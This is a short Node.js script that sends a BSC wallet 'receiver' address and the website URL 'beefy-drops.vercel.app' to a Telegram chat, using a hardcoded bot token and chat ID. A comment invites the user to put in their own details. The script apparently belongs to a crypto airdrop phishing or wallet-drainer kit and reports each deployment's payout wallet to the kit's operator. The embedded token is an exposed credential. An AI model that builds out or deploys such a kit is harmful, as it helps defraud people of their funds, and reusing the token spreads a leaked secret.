const axios = require('axios');

// Telegram Bot API token
const botToken = '7368134923:AAHMwTgYMZGzYLqVxY_5TemmNibKPjSfzqU';

// Telegram channel ID 
const chatId = '6556448976';


async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
    try {
        const message = `BSC Wallet Receiver ID: ${bsc_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const bsc_wallet_receiver_id = '0x66a4C667A4288D3DDb2591C861f567f3C43C8843';
const website_url = 'https://beefy-drops.vercel.app';
sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
